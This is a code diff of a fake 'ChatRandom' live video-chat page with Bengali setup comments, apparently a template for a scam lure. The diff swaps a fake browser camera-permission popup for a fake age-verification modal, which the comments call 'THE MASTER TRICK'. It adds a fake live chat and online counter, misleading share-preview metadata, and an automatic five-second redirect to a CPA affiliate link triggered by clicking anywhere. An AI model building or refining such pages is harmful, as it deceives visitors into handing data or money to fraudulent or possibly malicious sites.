@@ -4,10 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
+    <!-- LINK PREVIEW METAS (যাতে শেয়ার করলে সুন্দর থাম্বনেইল শো করে) -->
     <title>ChatRandom - Live Private Cam</title>
-    <meta property="og:title" content="🔴 Incoming Video Call...">
-    <meta property="og:description" content="A user nearby wants to video chat with you. Tap to accept.">
-    <meta property="og:image" content=" https://github.com/amanda25858-alt/text8/blob/main/Untitled%20design(1).jpg?raw=true">
+    <meta property="og:title" content="🔴 [LIVE] Incoming Video Call...">
+    <meta property="og:description" content="A user nearby wants to video chat with you. Tap to join the room.">
+    <!-- নিচের লিংকে আপনার সবচেয়ে আকর্ষণীয় থাম্বনেইল ছবির ডাইরেক্ট লিংক দিতে পারেন -->
+    <meta property="og:image" content="https://github.com/gdjg536ydiv-bot/affizerp/blob/main/C2CDnINUsAArk4M.jpg?raw=true">
+    <meta property="og:url" content="https://bedjfha.hubss.one/p/uyMfR">
+    <meta property="og:type" content="website">
     
     <style>
         /* =========================================
@@ -35,7 +39,7 @@
         /* VIDEO CARDS */
         .vid-card { position: relative; border-radius: 16px; overflow: hidden; background: #111; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); cursor: pointer; }
         
-        /* STRANGER CAM (RIGHT/TOP) - NOW WITH VIDEO */
+        /* STRANGER CAM */
         .stranger-cam { grid-column: 1; position: relative; background: #000; display: flex; justify-content: center; align-items: center; }
         .cam-video { width: 100%; height: 100%; object-fit: cover; filter: blur(20px) grayscale(50%); transition: all 1.5s ease-in-out; }
         .cam-video.live { filter: blur(0px) grayscale(0%); }
@@ -46,26 +50,24 @@
         .status-text { font-size: 18px; font-weight: 600; color: #fff; text-shadow: 0 2px 5px rgba(0,0,0,0.8); }
         .sub-status { font-size: 13px; color: #ff2a5f; margin-top: 5px; }
 
-        /* PLAY / UNMUTE BUTTON OVERLAY (The Trap) */
+        /* PLAY / UNMUTE BUTTON OVERLAY */
         .play-overlay { position: absolute; inset: 0; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 15; background: rgba(0,0,0,0.2); }
-        .play-btn-circle { width: 80px; height: 80px; background: rgba(255, 42, 95, 0.8); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 35px; color: white; box-shadow: 0 0 20px rgba(255, 42, 95, 0.6); animation: playPulse 1.5s infinite; padding-left: 5px; /* centers triangle */ }
+        .play-btn-circle { width: 80px; height: 80px; background: rgba(255, 42, 95, 0.8); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 35px; color: white; box-shadow: 0 0 20px rgba(255, 42, 95, 0.6); animation: playPulse 1.5s infinite; padding-left: 5px; }
         .play-text { margin-top: 15px; background: rgba(0,0,0,0.6); padding: 5px 15px; border-radius: 20px; font-size: 14px; font-weight: bold; border: 1px solid rgba(255,255,255,0.2); backdrop-filter: blur(5px); }
 
-        /* LIVE HUD (Heads Up Display) */
+        /* LIVE HUD */
         .live-hud { position: absolute; top: 15px; left: 15px; display: none; align-items: center; gap: 10px; z-index: 20; }
         .rec-badge { background: rgba(0,0,0,0.6); padding: 5px 10px; border-radius: 5px; font-size: 12px; font-weight: bold; color: white; display: flex; align-items: center; gap: 5px; backdrop-filter: blur(5px); border: 1px solid rgba(255,0,0,0.3); }
         .rec-dot { width: 8px; height: 8px; background: #ff2a5f; border-radius: 50%; animation: blink 1s infinite; }
         .live-timer { background: rgba(0,0,0,0.6); padding: 5px 10px; border-radius: 5px; font-size: 12px; font-weight: 600; backdrop-filter: blur(5px); }
 
-        /* MY CAM (LEFT/BOTTOM) */
+        /* MY CAM */
         .my-cam { grid-column: 2; background: #1a1a1d; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #666; position: relative; }
         .my-cam-icon { font-size: 50px; margin-bottom: 10px; color: #333; }
         .my-cam-text { font-size: 14px; text-align: center; padding: 0 20px; }
         .enable-btn { margin-top: 15px; background: #ff2a5f; color: white; padding: 8px 20px; border-radius: 20px; font-size: 13px; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 42, 95, 0.4); }
 
-        /* =========================================
-           CONTROLS & CHAT
-           ========================================= */
+        /* BOTTOM CHAT & CONTROLS */
         .bottom-section { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
         @media (max-width: 850px) { .bottom-section { grid-template-columns: 1fr; } }
 
@@ -91,13 +93,21 @@
         .action-btn:hover { background: rgba(255,255,255,0.1); transform: translateY(-2px); }
         .btn-next { background: linear-gradient(45deg, #ff2a5f, #ff7e5f); border: none; box-shadow: 0 5px 20px rgba(255, 42, 95, 0.4); }
 
-        /* FAKE BROWSER PERMISSION POPUP */
-        .permission-popup { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #fff; color: #333; padding: 15px 20px; border-radius: 8px; display: flex; align-items: center; gap: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); z-index: 9999; animation: slideDown 0.5s ease-out; }
-        .perm-icon { font-size: 20px; }
-        .perm-text { font-size: 13px; line-height: 1.4; }
-        .perm-btns { display: flex; gap: 10px; margin-left: 10px; }
-        .perm-btn-allow { background: #1a73e8; color: white; border: none; padding: 6px 12px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold; }
-        .perm-btn-block { background: #f1f3f4; color: #333; border: 1px solid #ddd; padding: 6px 12px; border-radius: 4px; font-size: 12px; cursor: pointer; }
+        /* =========================================
+           AGE VERIFICATION POPUP (THE MASTER TRICK)
+           ========================================= */
+        .verify-modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px); display: none; justify-content: center; align-items: center; z-index: 99999; padding: 20px; }
+        .verify-box { background: #1a1a1d; border: 1px solid #ff2a5f; border-radius: 16px; max-width: 450px; width: 100%; padding: 30px; text-align: center; box-shadow: 0 15px 40px rgba(255, 42, 95, 0.2); animation: scaleUp 0.3s ease-out; position: relative; }
+        .verify-icon { font-size: 50px; margin-bottom: 15px; }
+        .verify-title { font-size: 22px; font-weight: 700; color: #ff2a5f; margin-bottom: 10px; }
+        .verify-desc { font-size: 14px; color: #ccc; line-height: 1.6; margin-bottom: 20px; }
+        .verify-desc strong { color: #fff; }
+        
+        .timer-box { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px; font-size: 15px; font-weight: 600; margin-bottom: 20px; border: 1px dashed rgba(255,255,255,0.2); }
+        .timer-box span { color: #00ff88; font-size: 18px; }
+
+        .continue-btn { display: none; width: 100%; background: linear-gradient(45deg, #ff2a5f, #ff7e5f); border: none; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: bold; color: white; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 20px rgba(255, 42, 95, 0.4); }
+        .continue-btn:hover { opacity: 0.9; transform: translateY(-2px); }
 
         /* ANIMATIONS */
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.7); } 70% { box-shadow: 0 0 0 8px rgba(0, 255, 136, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); } }
@@ -105,24 +115,30 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes blink { 50% { opacity: 0; } }
         @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes slideDown { from { top: -50px; opacity: 0; } to { top: 20px; opacity: 1; } }
+        @keyframes scaleUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         @keyframes typeBounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
     </style>
 </head>
 <body>
 
-    <!-- FAKE PERMISSION POPUP -->
-    <div class="permission-popup" onclick="goToCPA()">
-        <div class="perm-icon">🔒</div>
-        <div class="perm-text"><b>chatrandom.com</b> wants to<br>Use your camera and microphone</div>
-        <div class="perm-btns">
-            <button class="perm-btn-block">Block</button>
-            <button class="perm-btn-allow">Allow</button>
+    <!-- AGE VERIFICATION POPUP (The Trust Builder) -->
+    <div class="verify-modal-overlay" id="verifyModal">
+        <div class="verify-box">
+            <div class="verify-icon">🔞</div>
+            <div class="verify-title">Age Verification Required</div>
+            <div class="verify-desc">
+                Due to a recent increase in underage users joining this room, our policy now requires verification.<br><br>
+                To continue face-to-face video chat, please quickly verify your <strong>Age (18+)</strong> and <strong>Gender</strong> on our secure partner site <strong>Hubss Security</strong>.
+            </div>
+            <div class="timer-box" id="timerBox">
+                Redirecting to secure verification in <span id="countdown">5</span> seconds...
+            </div>
+            <button class="continue-btn" id="continueBtn" onclick="executeRedirect()">Verify Now to Chat</button>
         </div>
     </div>
 
     <!-- HEADER -->
-    <header onclick="goToCPA()">
+    <header onclick="triggerVerification()">
         <div class="logo">ChatRandom</div>
         <div class="stats"><span class="pulse-dot"></span> <span id="onlineCount">142,854</span> Online</div>
     </header>
@@ -133,41 +149,33 @@
         <div class="video-grid">
             
             <!-- STRANGER VIDEO BOX -->
-            <div class="vid-card stranger-cam" onclick="goToCPA()">
+            <div class="vid-card stranger-cam" onclick="triggerVerification()">
                 
-                <!-- The Loading/Connecting Overlay -->
                 <div class="cam-overlay" id="camOverlay">
                     <div class="radar-spinner" id="spinner"></div>
                     <div class="status-text" id="statusText">Searching for someone...</div>
                     <div class="sub-status" id="subStatus">Connecting to nearest server</div>
                 </div>
 
-                <!-- PLAY / UNMUTE BUTTON (Appears after connection) -->
                 <div class="play-overlay" id="playOverlay">
                     <div class="play-btn-circle">▶</div>
                     <div class="play-text">Tap to Play & Unmute</div>
                 </div>
 
-                <!-- Live HUD -->
                 <div class="live-hud" id="liveHud">
                     <div class="rec-badge"><span class="rec-dot"></span> LIVE</div>
                     <div class="live-timer" id="liveTimer">00:00:00</div>
                 </div>
 
-                <!-- 
-                =================================================
-                আপনার ভিডিও লিংক ঠিক নিচে 'src' এর ভেতর বসাবেন 
-                =================================================
-                -->
+                <!-- আপনার ৫ সেকেন্ডের ভিডিও লিংক দিন -->
                 <video id="mainVideo" class="cam-video" autoplay loop muted playsinline>
-                    <!-- নিচে "YOUR_5_SECOND_VIDEO_LINK.mp4" কেটে আপনার ভিডিওর লিংক দিন -->
-                    <source src=" https://github.com/amanda25858-alt/text8/blob/main/Untitled%20design(1).jpg?raw=true">
+                    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
                     Your browser does not support HTML video.
                 </video>
             </div>
 
-            <!-- MY CAM BOX (Fake disabled state) -->
-            <div class="vid-card my-cam" onclick="goToCPA()">
+            <!-- MY CAM BOX -->
+            <div class="vid-card my-cam" onclick="triggerVerification()">
                 <div class="my-cam-icon">📷</div>
                 <div class="my-cam-text">Camera is disabled.<br>Click "Allow" in your browser.</div>
                 <div class="enable-btn">Enable Camera</div>
@@ -178,8 +186,7 @@
         <!-- BOTTOM CHAT & CONTROLS -->
         <div class="bottom-section">
             
-            <!-- FAKE CHAT -->
-            <div class="chat-container" onclick="goToCPA()">
+            <div class="chat-container" onclick="triggerVerification()">
                 <div class="chat-header">Live Chat (Encrypted)</div>
                 <div class="messages" id="chatBox">
                     <div style="text-align: center; font-size: 12px; color: #888; margin-bottom: 10px;">Connection secured. Say hi!</div>
@@ -198,11 +205,10 @@
                 </div>
             </div>
 
-            <!-- ACTION CONTROLS -->
             <div class="controls">
-                <div class="action-btn btn-next" onclick="goToCPA()">⏭ Next Stranger</div>
-                <div class="action-btn" onclick="goToCPA()">🎙 Unmute Mic</div>
-                <div class="action-btn" onclick="goToCPA()">⚙️ Settings & Filters</div>
+                <div class="action-btn btn-next" onclick="triggerVerification()">⏭ Next Stranger</div>
+                <div class="action-btn" onclick="triggerVerification()">🎙 Unmute Mic</div>
+                <div class="action-btn" onclick="triggerVerification()">⚙️ Settings & Filters</div>
             </div>
 
         </div>
@@ -210,10 +216,40 @@
     </div>
 
     <script>
-        // MASTER REDIRECT FUNCTION (The Trap)
-        const cpaLink = "https://t.taffizerq.com/719iel";
-        function goToCPA() {
-            window.location.href = cpaLink;
+        // ==========================================
+        // REDIRECT LOGIC WITH POPUP (THE TRUST TRICK)
+        // ==========================================
+        const targetCpaLink = "https://bedjfha.hubss.one/p/uyMfR";
+        let isVerifying = false;
+
+        function triggerVerification() {
+            if (isVerifying) return; // Prevent multiple clicks
+            isVerifying = true;
+            
+            // Show the popup
+            document.getElementById('verifyModal').style.display = 'flex';
+            
+            let timeLeft = 5;
+            const countdownEl = document.getElementById('countdown');
+            const timerBox = document.getElementById('timerBox');
+            const btn = document.getElementById('continueBtn');
+
+            // 5 Second Countdown
+            const timerInterval = setInterval(() => {
+                timeLeft--;
+                countdownEl.innerText = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerBox.style.display = 'none';
+                    btn.style.display = 'block'; // Show manual button just in case
+                    executeRedirect(); // Auto redirect
+                }
+            }, 1000);
+        }
+
+        function executeRedirect() {
+            window.location.href = targetCpaLink;
         }
 
         // ==========================================
@@ -231,7 +267,6 @@
 
         // Sequence Timeline
         setTimeout(() => {
-            // Step 1: Match Found
             statusText.innerText = "Match Found!";
             statusText.style.color = "#00ff88";
             subStatus.innerText = "Establishing P2P video stream...";
@@ -239,20 +274,15 @@
             document.getElementById('spinner').style.borderTopColor = "#00ff88";
             
             setTimeout(() => {
-                // Step 2: Decoding Video
                 statusText.innerText = "Decoding Stream...";
                 subStatus.innerText = "Quality: HD 1080p";
                 
                 setTimeout(() => {
-                    // Step 3: GO LIVE!
                     overlay.style.opacity = "0";
                     setTimeout(() => overlay.style.display = "none", 500);
                     
-                    // Video becomes clear
                     video.classList.add('live'); 
                     liveHud.style.display = "flex";
-                    
-                    // Show the PLAY / UNMUTE button to trap the user
                     playOverlay.style.display = "flex";
                     
                     startLiveTimer();
@@ -271,11 +301,7 @@
                 let mins = Math.floor((seconds % 3600) / 60);
                 let secs = seconds % 60;
                 
-                let timeStr = 
-                    (hrs < 10 ? "0" + hrs : hrs) + ":" + 
-                    (mins < 10 ? "0" + mins : mins) + ":" + 
-                    (secs < 10 ? "0" + secs : secs);
-                
+                let timeStr = (hrs < 10 ? "0" + hrs : hrs) + ":" + (mins < 10 ? "0" + mins : mins) + ":" + (secs < 10 ? "0" + secs : secs);
                 document.getElementById('liveTimer').innerText = timeStr;
             }, 1000);
         }
